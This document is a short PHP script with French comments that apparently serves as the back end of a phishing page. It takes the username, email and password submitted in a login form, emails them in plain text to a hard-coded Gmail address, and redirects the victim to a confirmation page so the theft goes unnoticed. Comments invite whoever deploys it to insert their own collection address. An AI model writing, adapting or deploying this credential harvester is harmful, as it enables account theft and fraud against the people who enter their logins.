<?php
// Vérifier si le formulaire a été soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données du formulaire
    
    $loginId = htmlspecialchars(trim($_POST['user']));
	$email = htmlspecialchars(trim($_POST['email']));
    $password = htmlspecialchars(trim($_POST['pass']));
    

    // Destinataire
    $to = 'bassolejustin7@gmail.com'; // Remplacez par votre adresse e-mail

    // Sujet
    $subject = 'Données de connexion reçues';

    // Corps du message
    $message = '
    <html>
    <head>
        <title>Données de connexion</title>
    </head>
    <body>
        <h1>Données de connexion</h1>
        
        <p><strong>utilisateur:</strong> ' . $loginId . '</p>
		<p><strong>Email:</strong> ' . $email . '</p>
        <p><strong>Mot de passe:</strong> ' . $password . '</p>
        
    </body>
    </html>
    ';

    // En-têtes
    $headers  = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: lesageactionnaire@gmail.com" . "\r\n"; // Remplacez par votre adresse e-mail

    // Envoi de l'e-mail
    if(mail($to, $subject, $message, $headers)) {
        // Redirection vers la page de confirmation
        header('Location: confirmation.html'); // sRemplacez par l'URL de la page de destination
        exit(); // Assurez-vous de quitter le script après la redirection
    } else {
        echo 'Échec de l\'envoi de l\'e-mail.';
    }
} else {
    echo 'Aucune donnée reçue.';
}
?>
